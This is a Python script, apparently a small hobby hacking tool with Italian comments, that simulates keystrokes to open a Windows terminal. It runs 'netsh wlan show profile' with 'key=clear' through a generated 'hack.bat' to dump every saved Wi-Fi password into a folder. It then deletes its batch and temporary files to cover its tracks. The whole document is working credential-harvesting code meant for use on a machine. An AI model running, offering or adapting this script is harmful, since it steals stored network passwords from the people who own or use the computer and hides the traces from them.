import typing
import keyboard
import time
import os

#resposible of all wifi username password he has
pathOfDevice = os.getcwd().lower()
commands = ["netsh wlan show profile","key=clear"]
fileName = "wifi.txt"
fileNameBat = "hack.bat"
folderName = "allWifis"
carStrani = ["\"","£","$","%","&","/","(",")","=","!","?","^","_","\\","*","€"]

def controlloCarStrano(car):
    for i in carStrani:
        if car == i:
            return True
    return False

def typingString(string):
    for i in string:  
        if i.isupper() or controlloCarStrano(i):
            # print(i)
            keyboard.press_and_release(f'shift+{i}')
        else:
            # print(i)
            keyboard.press_and_release(i)
    # print("\n")

def printPath(pathOfDevice):
    for i in pathOfDevice:
        if i == ':':
            keyboard.press_and_release('shift+.')
        else:
            keyboard.press_and_release(i)

def pressingTab(number):
    for i in range(number):
        keyboard.press_and_release("tab")

def goDown(number):
    for i in range(number):
        keyboard.press_and_release("down")


def openTerminal():
    keyboard.press_and_release('win')
    time.sleep(0.4)
    typingString("terminale")
    time.sleep(0.1)
    keyboard.press_and_release('enter')
    time.sleep(2)
    typingString("cd ")
    time.sleep(0.05)
    printPath(pathOfDevice)
    time.sleep(0.05)
    keyboard.press_and_release('enter')
    time.sleep(0.05)
    typingString(commands[0]+" ")
    time.sleep(0.05)
    keyboard.press_and_release('shift+<')
    time.sleep(0.05)
    typingString(" "+fileName)
    time.sleep(0.05)
    keyboard.press_and_release('enter')
    time.sleep(2)
    wifiNamesList = wifiUserExtractor(fileName)
    time.sleep(1)
    with open(fileNameBat, mode = 'w', encoding='utf-8') as f:
        for i in wifiNamesList:
            f.write(commands[0]+" \""+str(i)+"\" "+commands[1]+" > "+folderName+"/\""+str(i)+".txt\"\n")
    time.sleep(0.5)
    typingString(fileNameBat)
    time.sleep(0.5)
    keyboard.press_and_release('tab')
    time.sleep(1)
    keyboard.press_and_release('enter')
    time.sleep(5)
    typingString(f"rm {fileNameBat}")
    time.sleep(0.5)
    keyboard.press_and_release('tab')
    time.sleep(1)
    keyboard.press_and_release('enter')
    time.sleep(0.5)
    typingString(f"rm {fileName}")
    time.sleep(0.5)
    keyboard.press_and_release('tab')
    time.sleep(1)
    keyboard.press_and_release('enter')
    time.sleep(0.1)
    typingString("exit")
    time.sleep(0.05)
    keyboard.press_and_release('enter')
    time.sleep(0.05)

# extracts all wifi names and gives in a list
def wifiUserExtractor(fileName):
    content = []
    newList = []
    carInutili = 100
    carRigaInutili = 32
    carUtili = 32

    with open("wifi.txt", mode = 'r', encoding='utf-16') as f:
        content = f.read()

    content = content.replace("""
Profili sull'interfaccia Wi-Fi:

Profili di Criteri di gruppo (sola lettura)
---------------------------------
    <Nessuno>

Profili utente
-------------
""","")

    content = content.replace("    Tutti i profili utente    : ","")
    content.split("\n")
    lista = []

    for i in content:
        if i != '\n':
            lista.append(i)
        else:
            # string = ''.join([str(item) for item in lista])
            string = ""
            for item in lista:
                string = string+item
            newList.append(string)
            lista.clear()
    return newList


try:
    os.makedirs(folderName)
    print("directory " + folderName + " created ")
except FileExistsError:
    print("folder already maked")


openTerminal()


# print(lista)
